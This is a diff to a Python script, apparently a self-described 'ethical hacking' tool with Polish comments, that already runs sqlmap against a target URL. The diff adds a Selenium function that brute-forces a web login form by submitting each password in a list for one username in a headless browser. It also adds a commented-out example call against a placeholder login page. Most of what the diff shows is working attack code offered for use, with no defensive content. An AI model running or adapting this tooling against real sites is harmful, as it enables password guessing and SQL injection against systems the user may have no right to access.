@@ -14,6 +14,9 @@ import random
 import os
 import sys
 import subprocess
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.firefox.options import Options
 
 # Stałe
 TIMEOUT = 10  # Zwiększenie timeoutu do 10 sekund
@@ -107,6 +110,34 @@ async def sqlmap_scan(target_url):
     logging.info(f"Starting SQLMap scan on {target_url}...")
     subprocess.run(["sqlmap", "-u", target_url, "--batch"])
 
+async def selenium_brute_force(url, username_field_id, password_field_id, username, password_list):
+    """
+    Funkcja asynchroniczna do wykonania ataku brute-force za pomocą Selenium.
+    """
+    logging.info("Starting Selenium brute-force attack...")
+    options = Options()
+    options.headless = True  # Uruchomienie przeglądarki w trybie headless
+    driver = webdriver.Firefox(options=options)
+
+    driver.get(url)
+    for password in password_list:
+        try:
+            username_field = driver.find_element_by_id(username_field_id)
+            password_field = driver.find_element_by_id(password_field_id)
+
+            username_field.clear()
+            username_field.send_keys(username)
+            password_field.clear()
+            password_field.send_keys(password)
+
+            password_field.send_keys(Keys.RETURN)  # Submit form
+            # Możesz dodać tu sprawdzenie, czy zalogowanie się powiodło
+            logging.info(f"Tried username: {username} and password: {password}")
+        except Exception as e:
+            logging.error(f"An error occurred: {e}")
+
+    driver.quit()
+
 if __name__ == "__main__":
     # Parsowanie argumentów linii poleceń
     parser = argparse.ArgumentParser(description="Tool for ethical hacking purposes.")
@@ -137,3 +168,7 @@ if __name__ == "__main__":
     # Uruchomienie skanowania SQLMap
     target_url = f"http://{target}"  # Zakładamy, że strona jest dostępna przez HTTP
     asyncio.run(sqlmap_scan(target_url))
+
+    # Przykład użycia ataku brute-force z użyciem Selenium
+    # (pamiętaj, że to tylko przykład, należy go dostosować do własnych potrzeb)
+    # asyncio.run(selenium_brute_force("http://example.com/login", "username", "password", "admin", ["password1", "password2", "password3"]))
